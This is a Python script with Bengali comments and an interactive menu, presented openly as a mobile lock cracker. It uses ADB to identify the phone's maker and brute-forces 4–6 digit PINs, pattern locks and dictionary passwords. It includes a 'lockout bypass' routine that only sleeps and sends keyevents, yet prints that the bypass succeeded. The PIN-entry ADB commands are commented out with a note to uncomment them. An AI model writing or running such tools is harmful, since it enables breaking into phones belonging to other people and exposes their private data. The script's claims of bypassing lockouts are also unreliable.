import time
import subprocess
import random
from itertools import product
from datetime import datetime, timedelta

class MobileLockCracker:
    def __init__(self):
        self.device_profiles = {
            'samsung': {'lock_attempts': [5,10], 'wait_times': [30,60]},
            'xiaomi': {'lock_attempts': [5,10], 'wait_times': [60,120]},
            'default': {'lock_attempts': [5,10], 'wait_times': [30,60]}
        }
        self.current_device = self.detect_device()
        self.attempt_count = 0

    def detect_device(self):
        """ডিভাইসের ধরন সনাক্ত করুন"""
        try:
            result = subprocess.run("adb shell getprop ro.product.manufacturer",
                                  shell=True, capture_output=True, text=True)
            brand = result.stdout.strip().lower()
            return brand if brand in self.device_profiles else 'default'
        except:
            return 'default'

    def handle_lockout(self):
        """স্বয়ংক্রিয় লকআউট ব্যবস্থাপনা"""
        profile = self.device_profiles[self.current_device]
        
        for i, attempt in enumerate(profile['lock_attempts']):
            if self.attempt_count >= attempt:
                wait_time = profile['wait_times'][i] * random.uniform(0.9, 1.1)
                print(f"\n[!] লকআউট সনাক্ত! {wait_time:.1f} সেকেন্ড অপেক্ষা করুন...")
                
                # ডিভাইস বিশেষ বাইপাস পদ্ধতি
                if self.current_device == 'samsung':
                    subprocess.run("adb shell input keyevent KEYCODE_WAKEUP", shell=True)
                elif self.current_device == 'xiaomi':
                    subprocess.run("adb shell input keyevent KEYCODE_HOME", shell=True)
                
                time.sleep(wait_time)
                print("[+] লকআউট বাইপাস সফল!\n")
                return True
        return False

    def crack_pin(self, length=4):
        """পিন ক্র্যাকার"""
        print(f"\n[*] {length}-ডিজিট পিন ক্র্যাকিং শুরু...")
        
        for pin in self.generate_pins(length):
            self.attempt_count += 1
            
            if self.attempt_count % 5 == 0 and self.handle_lockout():
                continue
                
            print(f"চেষ্টা {self.attempt_count}: {pin}", end='\r')
            
            # ADB কমান্ড (আনকমেন্ট করুন)
            # subprocess.run(f"adb shell input text {pin}", shell=True)
            # subprocess.run("adb shell input keyevent 66", shell=True)
            
            time.sleep(random.uniform(0.5, 1.5))

    def crack_pattern(self, size=3):
        """প্যাটার্ন লক ক্র্যাকার"""
        print(f"\n[*] {size}x{size} প্যাটার্ন ক্র্যাকিং শুরু...")
        dots = [str(i) for i in range(1, size*size+1)]
        
        for pattern in self.generate_patterns(dots, 4):  # 4-পয়েন্ট প্যাটার্ন
            self.attempt_count += 1
            
            if self.attempt_count % 5 == 0 and self.handle_lockout():
                continue
                
            print(f"চেষ্টা {self.attempt_count}: {'-'.join(pattern)}", end='\r')
            time.sleep(random.uniform(1, 2))

    def dictionary_attack(self, wordlist=None):
        """ডিকশনারি অ্যাটাক"""
        wordlist = wordlist or ["password","1234","admin","0000"]
        print("\n[*] ডিকশনারি অ্যাটাক শুরু...")
        
        for word in wordlist:
            self.attempt_count += 1
            
            if self.attempt_count % 3 == 0 and self.handle_lockout():
                continue
                
            print(f"চেষ্টা {self.attempt_count}: {word}", end='\r')
            time.sleep(random.uniform(1, 3))

    def generate_pins(self, length):
        """পিন জেনারেটর"""
        for pin in product('0123456789', repeat=length):
            yield ''.join(pin)

    def generate_patterns(self, dots, length):
        """প্যাটার্ন জেনারেটর"""
        for pattern in product(dots, repeat=length):
            if len(set(pattern)) == len(pattern):  # ডুপ্লিকেট বিন্দু এড়ানো
                yield pattern

if __name__ == "__main__":
    print("""
    █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
    █  মোবাইল লক ক্র্যাকার   █
    █  (অটো লকআউট বাইপাস)   █
    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
    """)
    
    cracker = MobileLockCracker()
    print(f"[*] ডিভাইস সনাক্তকরণ: {cracker.current_device}")
    
    while True:
        print("\n1. পিন ক্র্যাকার")
        print("2. প্যাটার্ন ক্র্যাকার")
        print("3. ডিকশনারি অ্যাটাক")
        print("4. প্রোগ্রাম বন্ধ")
        
        choice = input("অপশন নির্বাচন করুন (1-4): ")
        
        if choice == "1":
            length = int(input("পিনের দৈর্ঘ্য (4-6): "))
            cracker.crack_pin(length)
        elif choice == "2":
            size = int(input("প্যাটার্ন সাইজ (3 বা 4): "))
            cracker.crack_pattern(size)
        elif choice == "3":
            words = input("কাস্টম ওয়ার্ডলিস্ট (কমা দিয়ে বিভক্ত): ")
            wordlist = [w.strip() for w in words.split(',')] if words else None
            cracker.dictionary_attack(wordlist)
        elif choice == "4":
            print("\n[+] প্রোগ্রাম বন্ধ করা হচ্ছে...")
            break
        else:
            print("\n[-] অবৈধ ইনপুট! আবার চেষ্টা করুন")
